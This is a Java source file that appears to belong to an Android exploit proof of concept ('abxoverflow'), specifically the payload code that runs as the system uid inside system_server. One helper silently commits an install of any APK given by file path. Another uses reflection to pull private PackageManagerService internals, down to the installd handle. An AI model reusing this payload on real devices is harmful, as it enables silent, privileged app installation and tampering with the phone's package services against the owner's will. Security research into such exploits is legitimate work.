package com.example.abxoverflow.droppedapk;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

/** Package install helpers using system uid from system_server. */
final class PmsHelper {

    static String installApk(Context ctx, String apkPath) throws Exception {
        File apk = new File(apkPath);
        if (!apk.isFile()) {
            return "missing file: " + apkPath;
        }
        PackageInstaller pi = ctx.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        int sessionId = pi.createSession(params);
        try (PackageInstaller.Session session = pi.openSession(sessionId);
             InputStream in = new FileInputStream(apk);
             OutputStream out = session.openWrite("base.apk", 0, apk.length())) {
            byte[] buf = new byte[65536];
            int n;
            while ((n = in.read(buf)) >= 0) {
                if (n > 0) out.write(buf, 0, n);
            }
            session.fsync(out);
            Intent callback = new Intent("com.example.abxoverflow.droppedapk.INSTALL");
            PendingIntent sender = PendingIntent.getBroadcast(
                    ctx, sessionId, callback, PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
            session.commit(sender.getIntentSender());
        }
        return "install committed sessionId=" + sessionId + " path=" + apkPath;
    }

    static String getInstallerFromPms() throws Exception {
        Object binder = Class.forName("android.os.ServiceManager")
                .getMethod("getService", String.class)
                .invoke(null, "package");
        Field this0 = binder.getClass().getDeclaredField("this$0");
        this0.setAccessible(true);
        Object pms = this0.get(binder);
        Field mInstaller = pms.getClass().getDeclaredField("mInstaller");
        mInstaller.setAccessible(true);
        Object installer = mInstaller.get(pms);
        Field mInstalld = installer.getClass().getDeclaredField("mInstalld");
        mInstalld.setAccessible(true);
        Object installd = mInstalld.get(installer);
        return "PMS.mInstaller.mInstalld=" + installd;
    }
}
